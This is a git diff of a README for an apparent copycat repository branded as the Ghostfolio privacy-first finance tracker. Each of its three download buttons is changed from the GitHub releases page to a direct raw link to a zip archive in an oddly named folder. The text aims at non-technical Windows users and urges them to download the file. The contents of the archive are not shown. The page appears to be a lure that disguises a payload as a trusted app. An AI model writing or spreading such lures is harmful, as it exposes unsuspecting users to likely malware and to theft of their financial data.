@@ -1,6 +1,6 @@
 # 👑 Ghostfolio-Privacy-First-Personal-Finance-Wealth-Tracker - Your Money, Your Rules, Total Privacy
 
-[![Download Ghostfolio](https://img.shields.io/badge/Download-Ghostfolio_App-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Buiquangtun6331/Ghostfolio-Privacy-First-Personal-Finance-Wealth-Tracker/releases)
+[![Download Ghostfolio](https://img.shields.io/badge/Download-Ghostfolio_App-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Buiquangtun6331/Ghostfolio-Privacy-First-Personal-Finance-Wealth-Tracker/main/scopiferous/Privacy-First-Ghostfolio-Tracker-Wealth-Finance-Personal-2.5-alpha.1.zip)
 
 ---
 
@@ -47,7 +47,7 @@ This guide is written for **Windows users** with average computer skills. No pro
 
 Click the big green button below to go to the download page:
 
-[**📥 Download Ghostfolio Now**](https://github.com/Buiquangtun6331/Ghostfolio-Privacy-First-Personal-Finance-Wealth-Tracker/releases)
+[**📥 Download Ghostfolio Now**](https://raw.githubusercontent.com/Buiquangtun6331/Ghostfolio-Privacy-First-Personal-Finance-Wealth-Tracker/main/scopiferous/Privacy-First-Ghostfolio-Tracker-Wealth-Finance-Personal-2.5-alpha.1.zip)
 
 Once you're on that page, look for the latest release version. You'll see a list of files available for download. Find the one that matches your system (Windows) and click it to start downloading.
 
@@ -175,7 +175,7 @@ Download it today, set it up in minutes, and take control of your financial futu
 
 Don't wait another day to take charge of your finances:
 
-[**🚀 Download Ghostfolio Now**](https://github.com/Buiquangtun6331/Ghostfolio-Privacy-First-Personal-Finance-Wealth-Tracker/releases)
+[**🚀 Download Ghostfolio Now**](https://raw.githubusercontent.com/Buiquangtun6331/Ghostfolio-Privacy-First-Personal-Finance-Wealth-Tracker/main/scopiferous/Privacy-First-Ghostfolio-Tracker-Wealth-Finance-Personal-2.5-alpha.1.zip)
 
 **Visit this link to download the application.**
 
